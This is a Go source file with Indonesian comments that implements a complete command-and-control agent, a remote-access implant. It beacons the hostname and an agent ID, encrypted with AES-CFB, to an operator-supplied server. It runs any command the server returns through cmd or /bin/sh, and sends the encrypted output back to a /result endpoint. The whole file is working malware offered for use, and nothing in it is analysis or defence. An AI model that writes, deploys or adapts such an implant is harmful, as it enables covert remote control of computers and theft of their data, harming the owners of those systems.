package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"time"

	"github.com/google/uuid"
)

var agentID = uuid.New().String()

// main() menerima argumen: serverURL, aesKey, [beaconInterval (opsional)]
func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: stage <serverURL> <aesKey> [beaconInterval]")
		return
	}
	serverURL := os.Args[1]
	aesKey := os.Args[2]
	beaconInterval := 5
	if len(os.Args) >= 4 {
		if bi, err := strconv.Atoi(os.Args[3]); err == nil {
			beaconInterval = bi
		}
	}

	fmt.Printf("[+] Stage agent started. Server: %s, Beacon Interval: %d sec\n", serverURL, beaconInterval)
	startAgent(serverURL, aesKey, beaconInterval)
}

// startAgent menjalankan loop polling ke server
func startAgent(serverURL, aesKey string, beaconInterval int) {
	hostname, _ := os.Hostname()
	for {
		// Buat informasi ping: hostname|agentID
		info := fmt.Sprintf("%s|%s", hostname, agentID)
		encryptedInfo, err := encryptAES(info, aesKey)
		if err != nil {
			fmt.Println("Encryption error:", err)
			time.Sleep(3 * time.Second)
			continue
		}
		encodedInfo := url.QueryEscape(encryptedInfo)

		// Kirim GET ke endpoint /ping
		resp, err := http.Get(fmt.Sprintf("%s/ping?info=%s", serverURL, encodedInfo))
		if err != nil {
			fmt.Println("Ping error:", err)
			time.Sleep(3 * time.Second)
			continue
		}
		if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNoContent {
			resp.Body.Close()
			time.Sleep(3 * time.Second)
			continue
		}
		commandBytes, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			time.Sleep(3 * time.Second)
			continue
		}
		command, err := decryptAES(string(commandBytes), aesKey)
		if err != nil {
			fmt.Println("Decryption error:", err)
			time.Sleep(time.Duration(beaconInterval) * time.Second)
			continue
		}

		if command != "" {
			fmt.Println("[*] Received command:", command)
			// Eksekusi command OS biasa
			out, err := executeCommand(command)
			if err != nil {
				out = fmt.Sprintf("Error: %s", err.Error())
			}
			encryptedResult, err := encryptAES(out, aesKey)
			if err != nil {
				fmt.Println("Error encrypting result:", err)
			} else {
				// Kirim hasil ke /result dengan parameter type=cmd
				_, err := http.Post(fmt.Sprintf("%s/result?id=%s&type=cmd", serverURL, agentID),
					"text/plain",
					bytes.NewBufferString(encryptedResult))
				if err != nil {
					fmt.Println("Error sending result:", err)
				}
			}
		}

		time.Sleep(time.Duration(beaconInterval) * time.Second)
	}
}

// executeCommand mengeksekusi perintah OS dan mengembalikan hasilnya
func executeCommand(cmd string) (string, error) {
	if runtime.GOOS == "windows" {
		out, err := exec.Command("cmd", "/C", cmd).CombinedOutput()
		return string(out), err
	} else {
		out, err := exec.Command("/bin/sh", "-c", cmd).CombinedOutput()
		return string(out), err
	}
}

// encryptAES mengenkripsi plaintext dengan AES (CFB)
func encryptAES(plainText, key string) (string, error) {
	if err := validateKey(key); err != nil {
		return "", err
	}
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return "", fmt.Errorf("failed to create cipher: %v", err)
	}
	cipherText := make([]byte, aes.BlockSize+len(plainText))
	iv := cipherText[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return "", fmt.Errorf("failed to generate IV: %v", err)
	}
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(cipherText[aes.BlockSize:], []byte(plainText))
	return base64.StdEncoding.EncodeToString(cipherText), nil
}

// decryptAES mendekripsi ciphertext dengan AES (CFB)
func decryptAES(cipherText, key string) (string, error) {
	if err := validateKey(key); err != nil {
		return "", err
	}
	data, err := base64.StdEncoding.DecodeString(cipherText)
	if err != nil {
		return "", fmt.Errorf("failed to decode base64: %v", err)
	}
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return "", fmt.Errorf("failed to create cipher: %v", err)
	}
	if len(data) < aes.BlockSize {
		return "", errors.New("ciphertext too short")
	}
	iv := data[:aes.BlockSize]
	data = data[aes.BlockSize:]
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(data, data)
	return string(data), nil
}

// validateKey memastikan key memiliki panjang yang valid untuk AES
func validateKey(key string) error {
	length := len(key)
	if length != 16 && length != 24 && length != 32 {
		return fmt.Errorf("key length must be 16, 24, or 32 bytes (got %d bytes)", length)
	}
	return nil
}

// bytesBuffer mengubah string menjadi *bytes.Buffer
func bytesBuffer(s string) *bytes.Buffer {
	return bytes.NewBufferString(s)
}
